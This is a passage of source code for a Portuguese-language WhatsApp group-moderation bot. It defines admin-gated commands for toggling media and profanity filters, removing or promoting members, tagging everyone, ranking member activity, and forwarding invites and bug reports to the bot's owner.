                if (!isBotGroupAdmins) return reply(` O BOT PRECISA SER ADMIN`)
                try {
                    if (args.length < 1) return reply('1 pra ativar, 0 pra desligar')
                    if (Number(args[0]) === 1) {
                        antidoc.push(from)
                        fs.writeFileSync('./datab/ants/antidoc.json', JSON.stringify(antidoc))
                        reply('Ativou com sucesso o recurso de anti documento neste grupo✔️')
                    } else if (Number(args[0]) === 0) {
                        antidoc.splice(from, 1)
                        fs.writeFileSync('./datab/ants/antidoc.json', JSON.stringify(antidoc))
                        reply('Desativou com sucesso o recurso de antidocumento neste grupo✔️')
                    } else {
                        reply('1 para ativar, 0 para desativar')
                    }
                } catch {
                    reply('Deu erro, tente novamente :/')
                }
                break

            case 'antisticker':

                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varantisticker 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varantisticker 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antisticker Está ${isAntiSticker ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break
            case 'varantisticker':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                if (args.length < 1) return reply('Hmmmm')
                if (Number(args[0]) === 1) {
                    if (isAntiSticker) return reply('Já Esta ativo')
                    antisticker.push(from)
                    fs.writeFileSync('./datab/ants/antisticker.json', JSON.stringify(antisticker))
                    reply('Ativou com sucesso o recurso de anti sticker neste grupo✔️')
                } else if (Number(args[0]) === 0) {
                    if (!isAntiSticker) return reply('Ja esta Desativado.')
                    antisticker.splice(from, 1)
                    fs.writeFileSync('./datab/ants/antisticker.json', JSON.stringify(antisticker))
                    reply('Desativou com sucesso o recurso de anti sticker neste grupo✔️')
                } else {
                    reply('1 para ativar, 0 para desativar')
                }
                break
            case 'antiimg':

                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varantiimg 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varantiimg 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antiimagem Está ${isAntiImg ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break
            case 'varantiimg':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                if (args.length < 1) return reply('Hmmmm')
                if (Number(args[0]) === 1) {
                    if (isAntiImg) return reply('Já Esta ativo')
                    antiimg.push(from)
                    fs.writeFileSync('./datab/ants/antiimg.json', JSON.stringify(antiimg))
                    reply('Ativou com sucesso o recurso de anti imagem neste grupo✔️')
                } else if (Number(args[0]) === 0) {
                    if (!isAntiImg) return reply('Ja esta Desativado.')
                    antiimg.splice(from, 1)
                    fs.writeFileSync('./datab/ants/antiimg.json', JSON.stringify(antiimg))
                    reply('Desativou com sucesso o recurso de anti imagem neste grupo✔️')
                } else {
                    reply('1 para ativar, 0 para desativar')
                }
                break
            case 'antiloc':

                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varantiloc 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varantiloc 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antilocalização Está ${Antiloc ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break
            case 'varantiloc':
                if (!isGroup) return reply(` SOMENTE EM GRUPOS`)
                if (!isGroupAdmins) return reply(`PRECISA SER ADMIN`)
                if (!isBotGroupAdmins) return reply(` O BOT PRECISA SER ADMIN`)
                try {
                    if (args.length < 1) return reply('1 pra ativar, 0 pra desligar')
                    if (Number(args[0]) === 1) {
                        if (Antiloc) return reply('Já está Ativo.')
                        antiloc.push(from)
                        fs.writeFileSync('./datab/ants/antiloc.json', JSON.stringify(antiloc))
                        reply('Ativou com sucesso o recurso de anti loc neste grupo✔️')
                    } else if (Number(args[0]) === 0) {
                        if (!Antiloc) return reply('Já está Desativado.')
                        antiloc.splice(from, 1)
                        fs.writeFileSync('./datab/ants/antiloc.json', JSON.stringify(antiloc))
                        reply('Desativou com sucesso o recurso de anti loc neste grupo✔️')
                    } else {
                        reply('1 para ativar, 0 para desativar')
                    }
                } catch {
                    reply('Deu erro, tente novamente :/')
                }
                break

            case 'antictt':
            case 'anticontato':

                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varantictt 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varantictt 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Anticontato Está ${isAntiCtt ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break
            case 'varantictt':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
                if (Number(args[0]) === 1) {
                    if (isAntiCtt) return reply('Ja esta ativo')
                    antictt.push(from)
                    fs.writeFileSync('./datab/ants/antictt.json', JSON.stringify(antictt))
                    reply('🌀 Ativou com sucesso o recurso de anticontato neste grupo 📝')
                } else if (Number(args[0]) === 0) {
                    if (!isAntiCtt) return reply('Ja esta Desativado')
                    pesquisar = from
                    processo = antictt.indexOf(pesquisar)
                    while (processo >= 0) {
                        antictt.splice(processo, 1)
                        processo = antictt.indexOf(pesquisar)
                    }
                    fs.writeFileSync('./datab/ants/antictt.json', JSON.stringify(antictt))
                    reply('‼️ Desativou com sucesso o recurso de anticontato neste grupo✔️')
                } else {
                    reply('1 para ativar, 0 para desativar')
                }
                break

            case 'antipalavrão':
            case 'antipalavrao':
                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varantipalavrao 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varantipalavrao 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antipalavrão Está ${isPalavrao ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break



            case 'varantipalavrao':
                if (!isGroup) return reply(`[❗] SOMENTE EM GRUPOS`)
                if (!isGroupAdmins) return reply(`[❗] O PRECISA SER ADMIN`)
                if (!isBotGroupAdmins) return reply(`[❗] O BOT PRECISA SER ADMIN`)
                if (args.length < 1) return reply(`[❗] 1 / 0, Exemplo ${prefix + command} 1`)
                if (Number(args[0]) === 1) {
                    if (isPalavrao) return reply('*Já esta ativado...*')
                    palavrao.push(from)
                    fs.writeFileSync('./datab/grupos/palavrao.json', JSON.stringify(palavrao))
                    reply(`[❗] anti palavrão ativado`)
                } else if (Number(args[0]) === 0) {
                    if (!isPalavrao) return reply('*Já esta Desativado...*')
                    palavrao.splice(from, 1)
                    fs.writeFileSync('./datab/grupos/palavrao.json', JSON.stringify(palavrao))
                    reply(`[❗] anti palavrão desativado...`)
                } else {
                    reply(`[❗] 1 / 0, Exemplo ${prefix + command} 0`)
                }
                await limitAdd(sender)
                break


            case 'marcar': {
                if (!m.isGroup) return m.reply('Só em Grupo')


                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                if (!isGroupAdmins) return reply(mess.admin)
                let teks = `══✪〘 *👥 Atenção!* 〙✪══`
                for (let mem of participants) {
                    teks += `⭔ @${mem.id.split('@')[0]}\n`
                }
                conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
            }
                break

            case 'comprarbot':
            case 'comprabot': {
                m.reply(`Para comprar o bot, acesse o link e procure por compradores:\n\nhttps://contate.me/NeoTecnolog`)
            }

                break

            case 'reviver':
            case 'unban':
                if (!m.isGroup) return m.reply('Esse comando so funciona em grupo, sinto muito')
                if (!isGroupAdmins && !isCreator) return reply('❌ VOCÊ NÃO É ADM PRA UTILIZAR ESTE COMANDO, DESCULPE, QUEM SABE UM DIA 😂')
                if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return m.reply('Marque uma mensagem do alvo!')
                addi = m.message.extendedTextMessage.contextInfo.participant
                sleep(5000)
                try {
                    await conn.groupParticipantsUpdate(from, [addi], "add")
                    reply('Usuario Adicionado de volta ao grupo.')
                } catch {
                    m.reply('[ ! ] Erro ao Adicionar Usuario de volta ao grupo.')
                }
                break

            case 'kick':
            case 'b':
            case 'ban':
            case 'banir':
            case 'chutar':
            case 'tirardogp': {


                if (!m.isGroup) return reply(mess.group)
                if (!isBotGroupAdmins) return reply(mess.botAdmin)
                if (!isGroupAdmins) return reply(mess.admin)

                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                if (users === '@s.whatsapp.net') return reply('Marca Alguem ou coloca o numero')
                if (users.length < 20) return reply('Insira um Numero Valido')
                if (botNumber.includes(users)) return reply('Não sou besta de banir eu mesmo né 🙁, mas estou decepcionado com você')
                if (numerodonobb.includes(users)) return reply('Não posso banir meu dono 🤧')
                try {
                    await conn.groupParticipantsUpdate(m.chat, [users], 'remove')
                } catch { m.reply('[ ! ] Erro ao Remover Usuario no Grupo.') }
            }

                break

            case 'checkativo':
                if (!m.isGroup) return reply(mess.group)
                if (!isBotGroupAdmins) return reply(mess.botAdmin)
                if (!isGroupAdmins) return reply(mess.admin)
                if (groupIdscount.indexOf(m.chat) < 0) return reply('*O bot não tem ainda dados sobre o grupo*')
                var ind = groupIdscount.indexOf(m.chat)
                if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('*Marque o número que deseja puxar a atividade*')
                mentioned = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                if (numbersIds.indexOf(mentioned) >= 0) {
                    var indnum = numbersIds.indexOf(mentioned)
                    conn.sendTextWithMentions(m.chat, `*Consulta da atividade de @${mentioned.split('@')[0]} no grupo*\n*Mensagens: ${countMessage[ind].numbers[indnum].messages}*\n*Comandos dados: ${countMessage[ind].numbers[indnum].cmd_messages}*`, m, mentioned)
                }
                else {
                    conn.sendTextWithMentions(m.chat, `*Consulta da atividade de @${mentioned.split('@')[0]} no grupo*\n*Mensagens: 0*\n*Comandos dados: 0*`, m, mentioned)
                }
                break




            case 'add':
            case 'adicionar':
            case 'addgp':
            case 'adicionarnogp': {


                if (!m.isGroup) return reply(mess.group)
                if (!isBotGroupAdmins) return reply(mess.botAdmin)
                if (!isGroupAdmins) return reply(mess.admin)
                let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }

                break
            case 'promover': {
                if (!m.isGroup) return reply(mess.group)
                if (!isBotGroupAdmins) return reply(mess.botAdmin)
                if (!isGroupAdmins) return reply(mess.admin)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                if (users === '@s.whatsapp.net') return reply('Marca Alguem ou coloca o numero')
                if (users.length < 20) return reply('Insira um Numero Valido')
                if (botNumber.includes(users)) return reply('Quanta burrice cara!')
                try {
                    await conn.groupParticipantsUpdate(m.chat, [users], 'promote')
                    await reply('Promovido com Sucesso.')
                } catch {
                    await reply('Erro ao Promover.')
                }
            }
                break
            case 'rebaixar': {
                if (!m.isGroup) return reply(mess.group)
                if (!isBotGroupAdmins) return reply(mess.botAdmin)
                if (!isGroupAdmins) return reply(mess.admin)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                if (users === '@s.whatsapp.net') return reply('Marca Alguem ou coloca o numero')
                if (users.length < 20) return reply('Insira um Numero Valido')
                if (botNumber.includes(users)) return reply('Não sou besta de rebaixar eu mesmo né 🙁, mas estou decepcionado com você')
                try {
                    await conn.groupParticipantsUpdate(m.chat, [users], 'demote')
                    await reply('Rebaixado com Sucesso.')
                } catch {
                    await reply('Erro ao Rebaixar.')
                }
            }
                break

            case 'status':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins && !isCreator && !m.key.fromMe) return reply(enviar.msg.adm)
                statuszada =
                    `ㅤ╭╼╼╾❲ S T A T U S ❳╼╼╾╮
    │
    │➱ Bem Vindo: ${isWelkom ? '✓' : '✕'}
    │➱ AdeusCara: ${isAdeusCara ? '✓' : '✕'}
    │➱ Nsfw: ${isNsfw ? '✓' : '✕'}
    │➱ AntiPalavrão: ${isPalavrao ? '✓' : '✕'}
    │➱ Antiaudio: ${isAntiAudio ? '✓' : '✕'}
    │➱ Antidocumento: ${Antidoc ? '✓' : '✕'}
    │➱ Antifake: ${isAntifake ? '✓' : '✕'}
    │➱ Antiimg: ${isAntiImg ? '✓' : '✕'}
    │➱ Antilink: ${isAntiLink ? '✓' : '✕'}
    │➱ AntiSticker: ${isAntiSticker ? '✓' : '✕'}
    │➱ Antiligação: ${isAnticall ? '✓' : '✕'}
    │➱ AntiPv: ${banChats ? '✓' : '✕'}
    │➱ AntilinkHard: ${isAntiLinkHard ? '✓' : '✕'}
    │➱ LimiteCaracteres: ${isAntiFlood ? '✓' : '✕'}
    │➱ Antivideo: ${isAntiVid ? '✓' : '✕'}
    │➱ AntiLocalização: ${Antiloc ? '✓' : '✕'}
    │
    ╰╼╾❲ ${NomeDoBot} ❳╼╾╯`

                wew = await getBuffer(`https://comunicadores.info/wp-content/uploads/2021/08/10-regras-grupos-whatsapp.png`)
                conn.sendMessage(from, { image: wew, caption: statuszada, thumbnail: null })

                break

            case 'nomegp':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                blat = args.join(" ")
                conn.groupUpdateSubject(from, `${blat}`)
                conn.sendMessage(from, { text: 'Sucesso, alterou o nome do grupo' }, { quoted: m })
                break

            case 'descgp':
            case 'descriçãogp':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.adm)
                blabla = args.join(" ")
                conn.groupUpdateDescription(from, `${blabla}`)
                conn.sendMessage(from, { text: 'Sucesso, alterou a descrição do grupo' }, { quoted: m })
                break

            case 'setfotogp':
            case 'fotogp':
                addFilter(from)
                if (!isGroup) return reply('Só pode ser utilizado em Grupo')
                if (!isGroupAdmins) return reply('Você precisa ser ADM')
                if (!isBotGroupAdmins) return reply('O bot Precisa ser ADM')
                if (!isQuotedImage) return reply(`Use: ${prefix + command} <Marque uma foto>`)
                ftgp = isQuotedImage ? m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : m.message.imageMessage
                rane = getRandom('.' + await getExtension(ftgp.mimetype))
                buffimg = await getFileBuffer(ftgp, 'image')
                fs.writeFileSync(rane, buffimg)
                medipp = rane
                await conn.updateProfilePicture(from, { url: medipp })
                await fs.unlinkSync(rane)
                reply(`Foto do grupo alterada com sucesso`)
                break

            case 'atividade':
            case 'atividades':
                try {
                    if (!isGroupAdmins && !isCreator) return reply(enviar.msg.adm)
                    if (isGroup && groupIdscount.indexOf(from) >= 0) {
                        var ind = groupIdscount.indexOf(from)
                        teks = `*Atividade dos membros do grupo:*\n\n`
                        mem = []
                        for (let obj of groupMembers) {
                            if (numbersIds.indexOf(obj.id) >= 0) {
                                var indnum = numbersIds.indexOf(obj.id)
                                teks += `*• Membro:* @${countMessage[ind].numbers[indnum].id.split('@')[0]}\n*• Comandos:* ${countMessage[ind].numbers[indnum].cmd_messages}\n*• Mensagens:* ${countMessage[ind].numbers[indnum].messages}\n\n----------------------------------\n\n`
                            } else {
                                teks += `*• Membro:* @${obj.id.split('@')[0]}\n*• Comandos:* 0\n*• Mensagens:* 0\n\n----------------------------------\n\n`
                            }
                            mem.push(obj.id)
                        }
                        conn.sendMessage(from, { text: teks, contextInfo: { mentionedJid: mem } }, { quoted: m })
                    } else return reply('*Nada foi encontrado*')
                } catch (e) {
                    console.log(e)
                }
                break

            case 'rankativo':
                if (!isGroup) return reply('Só pode ser utilizado em Grupo')
                if (!isGroupAdmins) return reply('Você precisa ser ADM')
                if (!isBotGroupAdmins) return reply('O bot Precisa ser ADM')
                if (groupIdscount.indexOf(m.chat) < 0) return reply('*O bot não tem ainda dados sobre o grupo*')
                var ind = groupIdscount.indexOf(m.chat)
                if (countMessage[ind].numbers.length < 3) return reply('*Necessita do registro de 3 usuarios*')
                countMessage[ind].numbers.sort((a, b) => (a.messages < b.messages) ? 1 : -1)
                mentioned_jid = []
                boardi = '*🔥Ranking dos membros mais ativos🔥*\n\n'
                try {
                    for (let i = 0; i < 3; i++) {
                        if (i == 0) boardi += `${i + 1}º 🥇 : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
                        else if (i == 1) boardi += `${i + 1}º 🥈 : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
                        else if (i == 2) boardi += `${i + 1}º 🥉 : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`

                        mentioned_jid.push(countMessage[ind].numbers[i].jid)
                    }
                    conn.sendTextWithMentions(m.chat, boardi, m, mentioned_jid)
                } catch (err) {
                    console.log(err)
                    reply(`*É necessário 3 pessoas para se construir um ranking*`)
                }
                break

            case 'checkativo':
                if (!isGroup) return reply('Só pode ser utilizado em Grupo')
                if (!isGroupAdmins) return reply('Você precisa ser ADM')
                if (!isBotGroupAdmins) return reply('O bot Precisa ser ADM')
                if (groupIdscount.indexOf(m.chat) < 0) return reply('*O bot não tem ainda dados sobre o grupo*')
                var ind = groupIdscount.indexOf(m.chat)
                if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('*Marque o número que deseja puxar a atividade*')
                mentioned = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                if (numbersIds.indexOf(mentioned) >= 0) {
                    var indnum = numbersIds.indexOf(mentioned)
                    conn.sendTextWithMentions(m.chat, `*Consulta da atividade de @${mentioned.split('@')[0]} no grupo*\n*Mensagens: ${countMessage[ind].numbers[indnum].messages}*\n*Comandos dados: ${countMessage[ind].numbers[indnum].cmd_messages}*`, m, mentioned)
                }
                else {
                    conn.sendTextWithMentions(m.chat, `*Consulta da atividade de @${mentioned.split('@')[0]} no grupo*\n*Mensagens: 0*\n*Comandos dados: 0*`, m, mentioned)
                }
                break

            case 'linkgp':
            case 'linkgroup':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                linkgc = await conn.groupInviteCode(from)
                reply('https://chat.whatsapp.com/' + linkgc)
                break

            case 'aviso':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                if (args.length < 1) return reply('Coloque seu aviso após o comando');
                let part = participantess(from, groupMembers)
                tag = `📢 *AVISO DO ADMINISTRADOR* 📢\n📍 @${sender.split('@')[0]}\n\n${body.slice(command.length + 2).toUpperCase()}\n\n${'='.repeat(20)}\n${'\u200B'.repeat(2000)}`
                for (let i = 0; i < part.length; i++) {
                    tag += `❧ @${part[i].split('@')[0]}\n`
                }
                options = {
                    text: tag,
                    mentions: part,
                    quoted: m
                }
                conn.sendMessage(from, options)
                break;

            case 'grupo':
                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}vargrupo a`, buttonText: { displayText: '🔑 ABRIR' }, type: 1 },
                    { buttonId: `${prefix}vargrupo f`, buttonText: { displayText: '🔒 FECHAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `ABRIR OU FECHAR GP`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break
            case 'vargrupo':
                if (!isGroup) return reply(`SÓ EM GRUPO`)
                if (!isGroupAdmins) return reply(`PRECISA SER ADMINISTRADOR`)
                if (!isBotGroupAdmins) return reply(`BOT PREPRECISA SER ADMINISTRADOR`)
                if (args[0] === 'a') {
                    reply(`*GRUPO ABERTO COM SUCESSO*`)
                    await conn.groupSettingUpdate(from, 'not_announcement')
                } else if (args[0] === 'f') {
                    reply(`*GRUPO FECHADO COM SUCESSO*`)
                    await conn.groupSettingUpdate(from, 'announcement')
                }
                break

            case 'grupoinfo':
            case 'infogrupo':
            case 'infogp':
            case 'gpinfo':
            case 'regras':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                ppUrl = await conn.profilePictureUrl(from, 'image')
                buffer = await getBuffer(ppUrl)
                const metadata = await conn.groupMetadata(from)
                conn.sendMessage(from, { image: buffer, caption: `*NOME* : ${groupName}\n*MEMBRO* : ${groupMembers.length}\n*ADMIN* : ${groupAdmins.length}\n*DESCRIÇÃO* : ${metadata.desc ? metadata.desc : 'Sem Descrição'}`, thumbnail: null }, { quoted: m })
                break

            case 'limpar':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`

                conn.sendMessage(from, { text: clear }, { quoted: selo, contextInfo: { forwardingScore: 500, isForwarded: true } })

                break

            case 'marcartodos': {
                if (!isGroup) return reply(`SÓ EM GRUPO`)
                if (!isGroupAdmins) return reply(`PRECISA SER ADMINISTRADOR`)
                if (!isBotGroupAdmins) return reply(`BOT PREPRECISA SER ADMINISTRADOR`)
                let teks = `══✪〘 *MARCANDO* 〙✪══

➲ *Motivo : ${q ? q : 'em branco'}*\n\n`
                for (let mem of participants) {
                    teks += `⭔ @${mem.id.split('@')[0]}\n`
                }
                conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
            }
                break
            case 'tagdivulga': {
                if (!isGroup) return reply(`SÓ EM GRUPO`)
                if (!isGroupAdmins) return reply(`PRECISA SER ADMINISTRADOR`)
                if (!isBotGroupAdmins) return reply(`BOT PREPRECISA SER ADMINISTRADOR`)
                let teks = `_⚠️atenção🛑_\n\n*Nós, administradores do grupo :\n${groupName}*\n\n${q ? q : 'em branco'}\n\n`
                for (let mem of participants) {
                    teks += `° @${mem.id.split('@')[0]}\n`
                }
                conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
            }
                break
            case 'hidetag':


                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotGroupAdmins) return m.reply(mess.botAdmin)
                if (!isGroupAdmins) return m.reply(mess.admin)
                conn.sendMessage(m.chat, { text: c ? c : '', mentions: groupMembers.map(r => r.id) })

                break
            case 'linkgroup':
            case 'linkgc':
            case 'linkgp':
            case 'linkgrupo':
            case 'grupolink':
            case 'getlinkgp': {


                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotGroupAdmins) return m.reply(mess.botAdmin)
                if (!isGroupAdmins) return m.reply(mess.admin)

                let response = await conn.groupInviteCode(m.chat)
                conn.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Do grupo : ${groupMetadata.subject}`, m, { detectLink: true })
            }

                break

            case 'delete':
            case 'del':
            case 'apagar':
            case 'apagamsg':
            case 'delmsg':
            case 'msgdel': {

                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotGroupAdmins) return m.reply(mess.botAdmin)
                if (!isGroupAdmins) return m.reply(mess.admin)
                if (!m.quoted) return reply('marca uma mensagem')
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return reply('Você pode marcar somente as mensagems do bot!')
                conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }

                break

            ////////////////////////////////////////////////////////////////////////////////////
            case 'convite':
                if (args.length == 0) return reply(`Digite o link do grupo
    Exemplo: !Convite https://chat.whatsapp.com/JOdlhLSDQEHC9dRBbmT5xf`)
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Preciso de um link que seja do whatsapp!')
                var codeInvite = body.slice(9).split('https://chat.whatsapp.com/')[1]
                if (!codeInvite) return reply('certifique-se de que o link está correto! ')
                if (args.length > 100) return reply('Máximo 100 caracteres')
                const p7gay = [`${setting.numerodono}@s.whatsapp.net`]

                buttonsi = [
                    { buttonId: `${prefix}entrarlink ${body.slice(9)}`, buttonText: { displayText: '✅ ADD BOT GRUPO ✅' }, type: 1 },
                    { buttonId: `${prefix}negarconvite ${sender.split("@s.whatsapp.net")[0]}`, buttonText: { displayText: '🚫 NEGAR CONVITE 🚫' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `[CONVITE]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\nLink: ${body.slice(9)}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(`${p7gay}`, buttonMessageiu, { quoted: m })

                await reply("O seu convite foi enviado ao meu dono e esta em analise; Spam = block + ban.")

                break
            case 'bug':
            case 'erro':
                if (!c) return m.reply(`Exemplo: ${prefix + command} bug ao mandar musica`)
                numerobug = m.sender
                await conn.sendMessage('558198539583@s.whatsapp.net', { text: `📢 *ERRO REPORTADO * 💻\n${'='.repeat(25)}\n⎆ de wa.me/${numerobug.split('@')[0]}\n${c}` }, { quoted: m })
                reply('_Seu erro foi reportado e será analizado pela minha equipe caso, abuse do comando block + ban. Obrigado._')
                break

            case 'avalie':
                const avalie = body.slice(8)
                if (args.length <= 1) return reply(`Exemplo: ${prefix}avalie Bot muito bom, parabéns.`)
                if (args.length >= 400) return reply('Máximo 400 caracteres')

                tdptls = `[ Avaliação ]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\n: ${avalie}`

                await conn.sendMessage(`${setting.numerodono}@s.whatsapp.net`, { text: `${tdptls}`, "contextInfo": { mentionedJid: [sender] } }, { quoted: m })
                reply("mensagem enviada ao meu dono, obrigado pela avaliação, iremos melhorar a cada dia.")
                break
            case 'doarpix':
